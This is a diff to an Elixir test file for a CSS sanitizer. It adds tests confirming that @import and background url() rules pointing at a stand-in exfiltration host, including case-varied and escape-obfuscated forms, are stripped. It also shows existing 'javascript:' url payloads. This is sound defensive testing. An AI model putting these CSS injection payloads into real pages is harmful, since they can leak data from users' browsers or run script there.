@@ -1,5 +1,5 @@
 defmodule HtmlSanitizeExScrubberCSSTest do
-  use ExUnit.Case
+  use ExUnit.Case, async: true
 
   def scrub_css(text) do
     HtmlSanitizeEx.Scrubber.CSS.scrub(text)
@@ -8,6 +8,7 @@ defmodule HtmlSanitizeExScrubberCSSTest do
   @good_css [
     ".test { color: red; border: 1px solid brown; }",
     "div.foo { width: 500px; height: 200px; }",
+    "p.justified { text-align: justify; }",
     # gibberish should work
     "GI b gkljfl kj { { { ********"
   ]
@@ -79,6 +80,37 @@ defmodule HtmlSanitizeExScrubberCSSTest do
     end)
   end
 
+  test "should NOT return invalid css / url() for @import" do
+    input = ~S|@import url(//evil.test/exfil.css);|
+    assert "" == scrub_css(input)
+
+    input = ~S|@IMPORT url(//evil.test/exfil.css);|
+    assert "" == scrub_css(input)
+
+    input = ~S|@IMPORT "//evil.test/exfil.css";|
+    assert "" == scrub_css(input)
+
+    input = ~S|@import"//evil.test/exfil.css";|
+    assert "" == scrub_css(input)
+
+    input = ~S|@\69 mport url(//evil.test/exfil.css);|
+    assert "" == scrub_css(input)
+
+    input = ~S|.comment { @import url(//evil.test/exfil.css) }|
+    expected = ~S|.comment { }|
+    assert expected == scrub_css(input)
+
+    input = ~S|.comment { @IMPORT url(//evil.test/exfil.css) }|
+    expected = ~S|.comment { }|
+    assert expected == scrub_css(input)
+  end
+
+  test "should NOT return invalid css / url() for background" do
+    input = ~S|.comment { background: url(//evil.test/exfil.css) }|
+    expected = ~S|.comment { background:  |
+    assert expected == scrub_css(input)
+  end
+
   @evil_css_background [
     # \uxxrl unicode
     "background:\\75rl('javascript:alert(\"\\75rl\")');",
@@ -103,5 +135,12 @@ defmodule HtmlSanitizeExScrubberCSSTest do
     Enum.each(@evil_css_background, fn text ->
       assert text != scrub_css(text)
     end)
+  end
+
+  test "should not crash on escapes that are not valid code points" do
+    # past U+10FFFF: an unterminated \\2019 followed by "CA"
+    assert scrub_css("color: red; font-family: \\2019CA") == "color: red; "
+    # surrogate
+    assert scrub_css("color: red; font-family: \\D800") == "color: red; "
   end
 end
